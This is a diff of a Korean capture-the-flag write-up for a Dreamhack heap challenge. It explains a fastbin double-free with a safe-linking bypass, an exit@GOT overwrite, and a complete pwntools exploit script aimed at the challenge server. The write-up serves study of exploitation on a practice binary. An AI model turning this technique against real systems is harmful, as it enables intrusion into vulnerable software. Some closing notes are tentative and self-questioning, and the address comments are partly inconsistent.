@@ -23,9 +23,7 @@ GOT overwrite 가능
 
 
 ```c
-
 struct note notes[10];
-
 ```
 
 
@@ -367,7 +365,6 @@ fastbin의 특성상 중복된 주소가 리스트에 두 번 들어가게 되�
 
 
 ```c
-
 typedef struct {
 
 size_t size;
@@ -375,8 +372,6 @@ size_t size;
 char *data;
 
 } Note;
-
-
 
 note notes[10];  // .bss: 0x4040A8 시작
 
@@ -411,9 +406,7 @@ notes[7]를 예시로 들면 notes[7]의 시작 주소는
 
 
 ```python
-
 create(7, 0x70, b'AAAA')
-
 ```
 
 
@@ -435,9 +428,7 @@ create가 가지는 의미는 다음과 같다.
 
 
 ```c
-
 *(notes[7].data) = b'AAAA'
-
 ```
 
 
@@ -447,9 +438,7 @@ create가 가지는 의미는 다음과 같다.
 
 
 ```c
-
 notes[7].data = AAAA
-
 ```
 
 
@@ -467,9 +456,7 @@ notes[7].data = AAAA
 
 
 ```c
-
 notes[7].data = elf.got['exit']
-
 ```
 
 
@@ -491,9 +478,7 @@ notes[7].data = elf.got['exit']
 
 
 ```python
-
 create(7, 0x60, p64(elf.got['exit']))
-
 ```
 
 
@@ -503,9 +488,7 @@ create(7, 0x60, p64(elf.got['exit']))
 
 
 ```c
-
 *(notes[7].data) = elf.got['exit']  // 포인터가 가리키는 곳의 값 덮기
-
 ```
 
 
@@ -531,13 +514,11 @@ create(7, 0x60, p64(elf.got['exit']))
 
 
 ```python
-
 delete(0); # A
 
 delete(1); # B
 
 delete(0); # A double free 발생!
-
 ```
 
 
@@ -551,9 +532,7 @@ delete(0); # A double free 발생!
 
 
 ```python
-
 create(0, 0x60, p64(fake_chunk_addr ^ (heap_leak >> 12)))
-
 ```
 
 
@@ -571,13 +550,11 @@ fd = fake_addr ^ (heap_base >> 12) 이어야 bypass 가능하다.
 
 
 ```python
-
 create(1, 0x60, b'b')  # B
 
 create(2, 0x60, b'a')  # A again
 
 create(3, 0x60, p64(elf.got['exit']))  # fake_chunk에 malloc 됨
-
 ```
 
 
@@ -607,181 +584,92 @@ update를 통해 7번 위치의 data에 0x401256 함수를 넣으면 익스 성�
 
 
 ```python
-
 from pwn import *
 
-
-
 p = remote("host8.dreamhack.games", 19728)
-
 #p = remote('localhost', 31337)
-
 #p = process('./note')
-
 elf = ELF("./note")
-
-
 
 def create(idx, size, data):
 
 p.sendline(b'1')
-
 p.sendlineafter(b'idx: ', str(idx).encode())
-
 p.sendlineafter(b'size: ', str(size).encode())
-
 p.sendafter(b'data: ', data)
 
-
-
 def read_note(idx):
-
 p.sendline(b'2')
-
 p.sendlineafter(b'idx: ', str(idx).encode())
-
 p.recvuntil(b"data: ")
 
 leak = p.recvline().strip()
 
 return leak
 
-
-
 def update(idx, data):
 
 p.sendline(b'3')
-
 p.sendlineafter(b'idx: ', str(idx).encode())
-
 p.sendafter(b'data: ', data)
 
-
-
 def delete(idx):
-
 p.sendline(b'4')
-
 p.sendlineafter(b'idx: ', str(idx).encode())
 
-
-
 def decrypt(cipher):
-
 key = 0
-
 plain = 0
 
-
-
 for i in range(1, 6):
-
     bits = 64-12*i
-
     if bits < 0:
-
         bits = 0
-
     plain = ((cipher ^ key) >> bits) << bits
-
     key = plain >> 12
-
-
 
 return plain
 
-
-
 create(7, 0x70, b'a') 
 
-
-
 for _ in range(7):
-
 create(9, 0x60, b'a')
-
 delete(9)
-
-
-
 create(0, 0x60, b'a')  
-
 create(1, 0x60, b'b')  
 
-
-
 delete(0)
-
 # fastbin: A -> NULL
 
-
-
 delete(1)
-
 # fastbin: B -> A -> NULL
 
-
-
 delete(0)
-
 # fastbin: A -> B -> A 
 
-
-
 leak = read_note(9)
-
 cipher = u64(leak.ljust(8, b'\x00'))
-
 print('leak : ', hex(cipher))
-
 decrypted_leak = decrypt(cipher)
-
 print('decrypt : ', hex(decrypted_leak))
-
-
 
 pause()
 
-
-
 fake_chunk_addr = 0x404110  # notes[7]
 
-
-
 create(0, 0x60, p64(fake_chunk_addr ^ ((decrypted_leak >> 12))))  # A
-
-
-
 create(1, 0x60, b'b')  # B
-
-
-
 create(2, 0x60, b'a')  # A dup, malloc 리턴값 = notes[7]
-
-
-
 create(3, 0x60, p64(elf.got['exit'])) # notes[7].ptr = exit@GOT
-
-
 
 update(7, p64(0x401256)) 
 
-
-
 p.sendline(b'1')
-
-
-
 p.sendlineafter(b'idx: ', b'A') #exit
-
 p.interactive()
-
 ```
 
-
-
 ![image.png](/assets/img/dh5note/image18.png)
-
 
 
 ---
@@ -798,27 +686,14 @@ p.interactive()
 
 shfit+f12 
 
-
-
 ![image.png](/assets/img/dh5note/image20.png)
-
-
 
 구조체 안에서 포인터 필드가 +8 offset에 위치하기 때문에 0x4040a0가 아닌 0x4040a8로 표시됨?
 
-
-
 fastbin dup 청크는 크기 0x20 → size=0x30
-
-
 
 create(idx, 0x30, ~~) 를 하면
 
-
-
 실제로는 size=0x40 청크가 생성되고, 이건 fastbin[2]에 들어감
 
-
-
 참고 : https://she11.tistory.com/157
-
